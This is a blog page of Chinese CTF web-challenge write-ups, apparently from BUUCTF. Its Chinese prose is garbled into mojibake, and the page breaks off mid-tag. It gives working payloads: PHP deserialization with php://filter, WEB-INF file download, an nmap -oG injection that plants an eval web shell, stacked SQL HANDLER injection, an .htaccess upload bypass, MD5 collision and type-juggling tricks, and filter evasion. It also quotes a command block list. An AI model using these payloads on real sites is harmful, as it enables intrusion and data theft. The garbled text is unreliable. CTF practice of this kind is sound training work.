id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gitpu38sj6j30qa0p6di4.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gitpuczb8yj30of0p5761.jpg" alt=""><br>å®¡è®¡ä»£ç å¯çŸ¥ï¼Œä¼ å…¥çš„strä¸­çš„æ¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„ASCIIèŒƒå›´åœ¨32åˆ°125ä¹‹é—´ï¼Œæ‰ä¼šå¯¹å…¶ååºåˆ—åŒ–ã€‚<br>è¿™é‡Œçš„file_put_contents()å‡½æ•°ï¼Œå°†$this-&gt;contentå†™å…¥$this-&gt;filenameä¸­ã€‚</p><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gitqs7f2stj30ce05274a.jpg" alt=""></p><p>åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œè°ƒç”¨äº†__destructææ„çš„æ–¹æ³•ï¼Œå…¶ä¸­op===â€2â€æ˜¯å¼ºæ¯”è¾ƒï¼Œéœ€è¦è¿›è¡Œç±»å‹çš„æ¯”è¾ƒã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gitqvqjoixj30fd06y0t3.jpg" alt=""><br>åœ¨processæ–¹æ³•ä¸­opä¸å­—ç¬¦çš„æ¯”è¾ƒä¸ºå¼±ç±»å‹æ¯”è¾ƒï¼Œæ‰€ä»¥è®©op=2ï¼Œåˆ™op===â€2â€ä¸ºfalseï¼Œop==â€2â€ä¸ºtrueã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gitqz76gc1j30id05eaa7.jpg" alt=""><br>readæ–¹æ³•ä¸­ï¼Œä½¿ç”¨äº†file_get_contentså‡½æ•°è¯»å–æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨php://filterä¼ªåè®®è¯»å–flagæ–‡ä»¶ã€‚è¯»å–çš„flagç”¨outputå‡½æ•°è¾“å‡ºã€‚</p><p>ç”±äº$opï¼Œ$filenameå’Œ$contentä¸‰ä¸ªå˜é‡éƒ½æ˜¯protectedï¼Œåœ¨åºåˆ—åŒ–æœ‰%00ï¼ŒASCIIæ˜¯0ï¼Œä¸èƒ½é€šè¿‡is_validå‡½æ•°çš„æ£€æµ‹ã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gitra5wrmzj30ow0d2q3n.jpg" alt=""><br>php7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿã€‚æ‰€ä»¥å¯ä»¥ç›´æ¥æ”¹ä¸ºpublicè¿›è¡Œç»•è¿‡ã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gitrbrjf72j31ci0hqq52.jpg" alt=""><br>æ„é€ payload:<code>?str=O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;}</code><br>æˆåŠŸè·å¾—flagã€‚</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/Cl0ud/p/12874458.html" target="_blank" rel="noopener">https://www.cnblogs.com/Cl0ud/p/12874458.html</a></p><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gitrlb8t0bj30mp04aglq.jpg" alt=""><br>ç‚¹å‡»helpï¼Œå¼¹å‡ºä¸€æ¡é”™è¯¯ä¿¡æ¯ï¼Œåº”è¯¥æ˜¯æœ‰help.docxè¿™ä¸ªæ–‡ä»¶ã€‚<br><img src="https:/large/tva4.sinaimg.cn//007u7C9Rgy1gitrndl7y7j30a101vglk.jpg" alt=""><br>ä¸‹è½½çš„æ–‡ä»¶ç”¨ç¼–è¾‘æ‰“å¼€å‘ç°æ˜¯pkå¼€å¤´çš„ï¼Œæ‰€ä»¥æ˜¯å‹ç¼©åŒ…æ–‡ä»¶ï¼Œè§£å‹åå¾—åˆ°ä¸€å †æ–‡ä»¶ï¼Œå‘ç°å¹¶æ²¡ä»€ä¹ˆç”¨ã€‚<br>ç™¾åº¦åçŸ¥é“äº†è¿™é¢˜è€ƒæŸ¥çš„çŸ¥è¯†ç‚¹ï¼š<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gitrzd05saj30sd07g759.jpg" alt=""><br>POSTä¼ å…¥filename=WEB-INF/web.xmlä¸‹è½½web.xmlæ–‡ä»¶ã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gits3vi33lj31010otwgm.jpg" alt=""><br>çœ‹åˆ°com.wm.ctf.FlagControllerã€‚<br>æ ¹æ®tomcatçš„é¡¹ç›®å­˜æ”¾è·¯å¾„æ¨æµ‹å‡ºFlagController.classçš„ä½ç½®ã€‚<br>æ„é€ payload:<code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code><br>ä¸‹è½½FlagController.classæ–‡ä»¶ã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gitsbia0sfj30s305q0sw.jpg" alt=""><br>æ‰“å¼€çœ‹åˆ°ä¸€ä¸²base64ç¼–ç ï¼Œè§£å¯†åå°±æ˜¯flagã€‚</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/wangtanzhi/p/12173215.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12173215.html</a></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gitsnc7frsj30n00cn3zr.jpg" alt=""><br>mkdirä¹‹å‰çš„@æ„æ€æ˜¯å‹åˆ¶é”™è¯¯æç¤ºï¼Œä½¿å…¶æ— é”™è¯¯æç¤ºã€‚</p><p>chdir()å‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚</p><p>escapeshellargå’Œescapeshellcmdå‚è€ƒï¼š<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener" title="PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡">https://paper.seebug.org/164/</a><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gitt1t51ggj30t90brdiu.jpg" alt=""><br>æœ€åä¸€å¥systemå¯ä»¥ä¼ å‚æ•°ï¼Œæ‰€ä»¥è‚¯å®šæ˜¯åˆ©ç”¨è¿™é‡Œæ„é€ payloadã€‚</p><p>åœ¨nmapå‘½ä»¤ä¸­ æœ‰ä¸€ä¸ªå‚æ•°-oGå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶ã€‚<br>æ‰€ä»¥æ„é€ payload:<code>?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gitu49i24oj30f204sq31.jpg" alt=""><br>é…ç½®èšå‰‘ï¼Œè¿æ¥ä¹‹ååœ¨æ ¹ç›®å½•æ‰¾åˆ°flagã€‚</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_26406447/article/details/100711933" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/100711933</a></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gitvpk0raij30vi05w3yt.jpg" alt=""><br>å‘ç°æœ¬é¢˜å’Œä¹‹å‰çš„[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ç±»ä¼¼ï¼Œä½†æ˜¯çœ‹äº†ä¸‹è¿‡æ»¤ï¼Œå‘ç°alterå’Œrenameéƒ½è¢«è¿‡æ»¤äº†ã€‚<br>ç™¾åº¦äº†ä¸‹ï¼Œå‘ç°æœ¬é¢˜å¯ä»¥ç”¨ä¸€ä¸ªæ–°çš„æ–¹æ³•ã€‚</p><p>å‚è€ƒï¼š<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener" title="å®˜æ–¹æ–‡æ¡£">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a></p><p>æ‰€ä»¥æ„é€ payload:<br>1â€™;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#<br>è·å¾—flagã€‚</p><h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><p>æœ¬é¢˜çŸ¥è¯†ç‚¹ï¼šthinkphp 5.0.23 RCEæ¼æ´<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gitx18uw2bj30nr0333ym.jpg" alt=""><br>æ„é€ ?s=123å³å¯åœ¨æŠ¥é”™ä¿¡æ¯ä¸­çœ‹åˆ°thinkphpçš„ç‰ˆæœ¬å·ã€‚</p><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener" title="ThinkPHP 5.0.0~5.0.23 RCE æ¼æ´åˆ†æ">https://xz.aliyun.com/t/3845</a><br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gitxd4g2mwj30rv0dzt9v.jpg" alt=""><br>æ„é€ payloadæŸ¥çœ‹æ ¹ç›®å½•å‘ç°flagã€‚<br>ä½¿ç”¨cat /flagå‘½ä»¤è·å¾—flagã€‚</p><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>æ‰“å¼€é¢˜ç›®å‘ç°ä¸€å †ä»£ç ï¼Œè€Œä¸”è¿˜å¾ˆä¹±ï¼Œéœ€è¦æ•´ç†ä¸€ä¸‹ã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gityx5zqrvj30p70ontab.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gityxg8ze2j30kw0oktah.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gityxrsi9jj30le0f3dgj.jpg" alt=""><br>os.urandom:éšå³äº§ç”Ÿnä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸²</p><p>os.path.exists(path): å¦‚æœè·¯å¾„ path å­˜åœ¨ï¼Œè¿”å› Trueï¼›å¦‚æœè·¯å¾„ path ä¸å­˜åœ¨ï¼Œè¿”å› Falseã€‚ </p><p>@app.route(â€˜/â€˜):Flaskè·¯ç”±(æ ¹ç›®å½•è·¯ç”±å™¨)</p><p>urllib.unquote:å°†å­—ç¬¦ä¸²ä¸­çš„urlç¼–ç è§£ç ã€‚</p><p>json.dumpsï¼šPython å¯¹è±¡ç¼–ç æˆ JSON å­—ç¬¦ä¸²</p><p>urllib.urlopenï¼šåˆ›å»ºä¸€ä¸ªè¡¨ç¤ºè¿œç¨‹urlçš„ç±»æ–‡ä»¶å¯¹è±¡ï¼Œç„¶ååƒæœ¬åœ°æ–‡ä»¶ä¸€æ ·æ“ä½œè¿™ä¸ªç±»æ–‡ä»¶å¯¹è±¡æ¥è·å–è¿œç¨‹æ•°æ®ã€‚</p><p>hashlib.md5().hexdigest()ï¼šhashlib.md5()#è·å–ä¸€ä¸ªmd5åŠ å¯†ç®—æ³•å¯¹è±¡ï¼Œhexdigest()æ˜¯è·å¾—åŠ å¯†å¥½çš„16è¿›åˆ¶å­—ç¬¦ä¸²ã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gitzy0e6qrj30ik06g74n.jpg" alt=""><br>å‘/De1taè·¯ç”±æäº¤å‚æ•°åï¼Œä¼šæ‰§è¡Œchallengeå‡½æ•°ï¼Œç»•è¿‡wafæ£€æµ‹åä¼šåˆ›å»ºTaskç±»æ‰§è¡ŒExecå‡½æ•°ã€‚</p><p>æ‰€ä»¥éœ€è¦é€šè¿‡checkSignå‡½æ•°çš„æ£€æµ‹å³é€šè¿‡getSignå‡½æ•°çš„æ£€æµ‹ã€‚<br>åªæœ‰å‘/geneSignè·¯ç”±æäº¤å‚æ•°åæ‰èƒ½è¿”å›getSignè·å¾—æ­£ç¡®çš„signå€¼ä»è€Œç»•è¿‡getSignçš„æ£€æµ‹ã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giu0gsvqf3j30t90js0tm.jpg" alt=""><br>æ„é€ payload:geneSign?param=flag.txtreadè·å¾—signå€¼bbf07a512ad05225d0744b68e2830cb0ã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giu0ppozjvj30p40kbgmg.jpg" alt=""><br>æ„é€ payload:De1ta?param=flag.txtå¹¶ä¸”ä¼ å…¥cookie:actionå€¼ä¸ºreadscan,signå€¼ä¸ºbbf07a512ad05225d0744b68e2830cb0ã€‚ä»è€Œè·å¾—flagã€‚actionåŒ…å«â€scanâ€åˆ™ä¼šä¿®æ”¹codeçš„å€¼ä¸ºï¼ŒactionåŒ…å«â€readâ€å¹¶ä¸”codeä¸º200æ—¶æ‰ä¼šå†™å…¥flagã€‚</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_43900387/article/details/105278192" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43900387/article/details/105278192</a></p><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>æœ¬é¢˜è€ƒæŸ¥çš„æ˜¯æ— å‚æ•°RCEã€‚eval($_GET[â€˜expâ€™]);</p><p>1.åˆ©ç”¨è¶…å…¨å±€å˜é‡è¿›è¡Œbypassï¼Œè¿›è¡ŒRCE</p><p>2.è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–</p><p>æœ¬é¢˜å¦å¤–ä¸€ä¸ªçŸ¥è¯†ç‚¹æ˜¯.gitæºç æ³„éœ²ï¼Œåˆ©ç”¨GitHackè¿›è¡Œæ‰«æã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giuxlx7q4dj30rr02waa4.jpg" alt=""><br>å‘ç°index.phpæ–‡ä»¶ã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giuxnej7d3j30q20e575e.jpg" alt=""><br>å‘ç°æ˜¯æœ¬é¢˜çš„æºç index.phpã€‚</p><p>å®¡è®¡ä»£ç å¯çŸ¥æœ¬é¢˜è¿‡æ»¤äº†ä¸€äº›æ¯”è¾ƒå¸¸ç”¨çš„ä¼ªåè®®ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥è¯»å–æ–‡ä»¶äº†ã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giuxzgh3zrj30t502lgln.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giuy9d8orgj30on02lq2y.jpg" alt=""><br>æ­£åˆ™åŒ¹é…[a-z,_]+((?R)?)ï¼Œæ‰€ä»¥åªå…è®¸a(b(c()))ï¼Œa()ç­‰è¿™æ ·çš„å½¢å¼ï¼Œæ‰€ä»¥å°±ä¸èƒ½ä¼ å‚ã€‚</p><p>é¦–å…ˆå¾—æƒ³åŠæ³•çˆ†å‡ºæ–‡ä»¶çš„ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œåˆ©ç”¨scandir()å‡½æ•°å¯ä»¥æ‰«æå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæ‰€ä»¥ä¼šæƒ³æ„é€ print_r(scandir(â€˜.â€™)),è€Œæœ¬é¢˜ä¸èƒ½ä¼ å‚ã€‚</p><p>æ‰€ä»¥æœ‰å¦å¤–ä¸€ä¸ªå‡½æ•°localeconv()ï¼Œlocaleconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚è€Œæ•°ç»„çš„è¯å°±è¦ç”¨åˆ°current() å‡½æ•°,post()æ˜¯current()çš„åˆ«åã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giuz2mu7kkj30ow0lpabv.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giuz55lbmhj30uq0jjq3x.jpg" alt=""><br>è¿™æ ·å°±çˆ†å‡ºäº†å½“å‰çš„ç›®å½•ã€‚æ‰€ä»¥æˆ‘ä»¬è¦å¾—åˆ°å€’æ•°ç¬¬äºŒä¸ªæ•°ç»„çš„å†…å®¹ã€‚<br>æ‰€ä»¥å¯ä»¥åˆ©ç”¨array_reverse()å‡½æ•°ï¼Œä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ã€‚<br>é¡ºåºé¢ å€’åflag.phpåœ¨ç¬¬äºŒä¸ªæ•°ç»„ä¸­ï¼Œæ‰€ä»¥æ„é€ payload:<br><code>?exp=print_r(next(array_reverse(scandir(current(localeconv())))))</code>;ä½†æ˜¯è¿™æ ·åªèƒ½æ‰“å°å˜é‡ï¼Œè€Œä¸èƒ½è¯»flag.phpçš„æºç ï¼Œè€Œä¸”file_get_contents()ä¸­çš„etè¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨readfile()ï¼Œhighlight_file()è·å¾—show_resource()å‡½æ•°è¯»å–flagã€‚å…¶ä»–æ–¹æ³•å‚è€ƒä¸‹é¢çš„åšå®¢ã€‚</p><p>å‚è€ƒï¼š<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE</a><br><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12260986.html</a></p><h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>æ‰“å¼€é¢˜ç›®æ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Œå°è¯•ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬çš„jpgæ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œä¿®æ”¹æ–‡ä»¶åç¼€ä¸ºphpè¢«æ£€æµ‹å‡ºæ¥äº†ï¼Œå°è¯•php3,php4,php5,phtml,phtç»•è¿‡æ£€æµ‹å‘ç°éƒ½ä¸å¯ä»¥ï¼Œè¯´æ˜æœ¬é¢˜åªèƒ½ä¸Šä¼ å›¾ç‰‡ã€‚</p><p>æ‰€ä»¥æƒ³åˆ°ä¸Šä¼ .htaccessï¼Œè®©.htaccessè§£æå›¾ç‰‡ä¸ºphpæ–‡ä»¶è¿è¡Œæœ¨é©¬ã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giv2m4pw6gj30w70dsdjg.jpg" alt=""></p><p>å¯ä»¥åœ¨.htaccess åŠ å…¥phpè§£æè§„åˆ™</p><p>ç±»ä¼¼äºæŠŠæ–‡ä»¶ååŒ…å«1çš„è§£ææˆphp</p><pre><code>&lt;FilesMatch &quot;1&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giv2h16eiuj30wf0d5abr.jpg" alt=""><br>ä¸æ˜¯å›¾ç‰‡ä¸èƒ½ä¸Šä¼ ï¼Œä¿®æ”¹Content-Typeä¸ºimage/jpegä¸Šä¼ æˆåŠŸã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giv2j3rhr0j30pl04nmxj.jpg" alt=""><br>ä¸Šä¼ å¸¦æœ¨é©¬çš„å›¾ç‰‡æ–‡ä»¶ã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giv2kjbk3ej30pc0bi3zf.jpg" alt=""><br>åœ¨æ ¹ç›®å½•ä¸‹è·å¾—flagã€‚</p><h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giv35h4xwoj30n503rweu.jpg" alt=""><br>æ‰“å¼€æºç ï¼Œå‘ç°é¢˜ç›®ç»™çš„æç¤ºmd5ï¼Œå¹¶ä¸”æºç ä¸­imgä¸­çš„å†…å®¹æ˜¯å›¾ç‰‡çš„base64ç¼–ç ã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giv3jjq8lhj30sd028jrg.jpg" alt=""><br>æ„Ÿè§‰imgä¸­é‚£æ®µç¼–ç æ˜¯base64ç¼–ç ã€‚</p><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giv3lrgqapj308p02h0sl.jpg" alt=""></p><p>ç»è¿‡ä¸¤æ¬¡base64è§£ç å’Œä¸€æ¬¡hexè§£ç åå¾—åˆ°imgçš„åå­—ä¸º555.pngï¼Œæ‰€ä»¥å¯ä»¥å°è¯•åˆ©ç”¨ç±»ä¼¼çš„æ–¹æ³•è¯»å–æ–‡ä»¶ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giv3ovzb3sj30aq03bwee.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giv3poldw0j30xy0j8juy.jpg" alt=""><br>å°è¯•è¯»å–flag.phpï¼Œåº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†æ‰€ä»¥ä¸èƒ½æŸ¥çœ‹ã€‚</p><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giv3v2vvb6j30a902qa9y.jpg" alt=""></p><p>å°è¯•è¯»å–index.phpæ–‡ä»¶è·å¾—é¢˜ç›®æºç ã€‚æ‰§è¡Œååœ¨imgä¸­å¾—åˆ°index.phpæ–‡ä»¶çš„base64ç¼–ç ã€‚</p><pre><code>&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&apos;content-type:text/html;charset=utf-8&apos;);$cmd = $_GET[&apos;cmd&apos;];if (!isset($_GET[&apos;img&apos;]) || !isset($_GET[&apos;cmd&apos;]))     header(&apos;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&apos;);$file = hex2bin(base64_decode(base64_decode($_GET[&apos;img&apos;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) {    echo &apos;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&apos;;    die(&quot;xixiï½ no flag&quot;);} else {    $txt = base64_encode(file_get_contents($file));    echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot; . $txt . &quot;&apos;&gt;&lt;/img&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;}echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&apos;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) {    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;} else {if ((string)$_POST[&apos;a&apos;] !== (string)$_POST[&apos;b&apos;] &amp;&amp; md5($_POST[&apos;a&apos;]) === md5($_POST[&apos;b&apos;])) {    echo `$cmd`;} else {    echo (&quot;md5 is funny ~&quot;);    }}?&gt;</code></pre><p>è§£ç åè·å¾—æœ¬é¢˜æºç ã€‚</p><pre><code>if ((string)$_POST[&apos;a&apos;] !== (string)$_POST[&apos;b&apos;] &amp;&amp; md5($_POST[&apos;a&apos;]) === md5($_POST[&apos;b&apos;])) {echo `$cmd`;} else {echo (&quot;md5 is funny ~&quot;);}</code></pre><p>ç»è¿‡è¿™ä¸€å±‚çš„åˆ¤æ–­ï¼Œæ‰ä¼šè¿è¡Œcmdå‘½ä»¤ã€‚åå¼•å·ç¬¦å·åŒ…å›´æ˜¯æ‰§è¡Œshellå‘½ä»¤ã€‚<br>md5è¿›è¡Œå¼ºæ¯”è¾ƒæ—¶æ˜¯å¯ä»¥é€šè¿‡æ•°ç»„ç»•è¿‡çš„ï¼Œä½†æ˜¯è¿™é‡Œå°†æ•°æ®è¿›è¡Œäº†å¼ºåˆ¶è½¬æ¢ï¼Œæ‰€ä»¥ç”¨æ•°ç»„å‰åŠéƒ¨åˆ†å°±ä¸èƒ½é€šè¿‡åˆ¤æ–­ã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giv5rtg6mtj31h00ekdi4.jpg" alt=""></p><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">https://xz.aliyun.com/t/2232</a><br>åˆ©ç”¨MD5ç¢°æ’ç”Ÿæˆå™¨æ„å»ºä¸¤ä¸ªMD5ä¸€æ ·ï¼Œä½†æ˜¯å†…å®¹å®Œå…¨ä¸ä¸€æ ·çš„å­—ç¬¦ä¸²ã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giv5ug9muhj31by0f4mzw.jpg" alt=""><br>ä¸Šä¼ ä¹‹åä»è€Œç»•è¿‡æ£€æµ‹æ‰§è¡Œå‘½ä»¤ï¼Œå³å¯çœ‹åˆ°æ ¹ç›®å½•ä¸‹æœ‰flagï¼Œä½†æ˜¯catè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä½¿ç”¨ca\t%20flagè·å¾—flagã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giv5xxzfxvj31bf0e6wh4.jpg" alt=""></p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><pre><code>include &apos;flag.php&apos;;$flag=&apos;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&apos;;if(isset($_GET[&apos;gg&apos;])&amp;&amp;isset($_GET[&apos;id&apos;])) {    $id=$_GET[&apos;id&apos;];    $gg=$_GET[&apos;gg&apos;];    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) {        echo &apos;You got the first step&apos;;        if(isset($_POST[&apos;passwd&apos;])) {               $passwd=$_POST[&apos;passwd&apos;];            if (!is_numeric($passwd))            {                if($passwd==1234567)                {                     echo &apos;Good Job!&apos;;                     highlight_file(&apos;flag.php&apos;);                    die(&apos;By Retr_0&apos;);                }                else                 {                     echo &quot;can you think twice??&quot;;                 }            }            else{                echo &apos;You can not get it !&apos;;            }            }            else{                die(&apos;only one way to get the flag&apos;);        }}        else {        echo &quot;You are not a real hacker!&quot;;        }}else{    die(&apos;Please input first&apos;);}</code></pre><p>æ ¹æ®æç¤ºï¼Œç›´æ¥F12å¾—åˆ°æºç ã€‚</p><p>å®¡è®¡ä»£ç å¯çŸ¥ï¼Œç¬¬ä¸€æ­¥éœ€è¦ç»•è¿‡md5ï¼Œè¿™é‡Œä¸åƒä¸Šä¸€é¢˜ä¼šè½¬æ¢ç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼Œmd5()æ— æ³•æ“ä½œæ•°ç»„ï¼Œä¼šè¿”å›nullã€‚<br>ç¬¬äºŒæ­¥ä¾¿æ˜¯è¦ç»•è¿‡passwdçš„æ£€æµ‹ï¼Œis_numericå¯ä»¥ä½¿ç”¨1234567;ç»•è¿‡ï¼Œç”±äº$passwd==1234567æ˜¯è‹¥æ¯”è¾ƒï¼Œæ‰€ä»¥åœ¨æ¯”è¾ƒæ—¶ä¼šæŠŠpasswdè½¬æˆæ•°å­—è¿›è¡Œæ¯”è¾ƒï¼Œæ‰€ä»¥å°±èƒ½ç»•è¿‡æ£€æµ‹ï¼Œè·å¾—flagã€‚</p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1givvqshbrbj30pw075gm6.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1givwfshwfgj307g01qjr6.jpg" 